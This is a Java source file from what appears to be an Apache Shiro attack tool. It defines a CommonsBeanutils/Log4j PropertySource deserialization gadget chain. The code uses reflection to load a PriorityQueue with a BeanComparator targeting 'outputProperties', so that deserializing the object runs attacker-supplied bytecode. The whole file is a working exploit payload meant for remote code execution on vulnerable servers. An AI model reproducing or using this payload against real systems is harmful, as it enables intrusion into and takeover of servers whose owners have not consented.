package com.sma11new.exp.shiro.attack.payloads;

import com.sma11new.exp.shiro.attack.payloads.annotation.Authors;
import com.sma11new.exp.shiro.attack.payloads.annotation.Dependencies;
import com.sma11new.exp.shiro.attack.util.Reflections;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.logging.log4j.util.PropertySource;

import java.util.PriorityQueue;
import java.util.Queue;

@Dependencies(value={"commons-beanutils:commons-beanutils:1.8.3"})
@Authors(value={"SummerSec"})
public class CommonsBeanutilsPropertySource
implements ObjectPayload<Queue<Object>> {
    @Override
    public Queue<Object> getObject(Object template) throws Exception {
        PropertySource propertySource1 = new PropertySource(){

            @Override
            public int getPriority() {
                return 0;
            }
        };
        BeanComparator beanComparator = new BeanComparator(null, new PropertySource.Comparator());
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add(propertySource1);
        queue.add(propertySource1);
        Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
        Reflections.setFieldValue(beanComparator, "property", "outputProperties");
        return queue;
    }
}

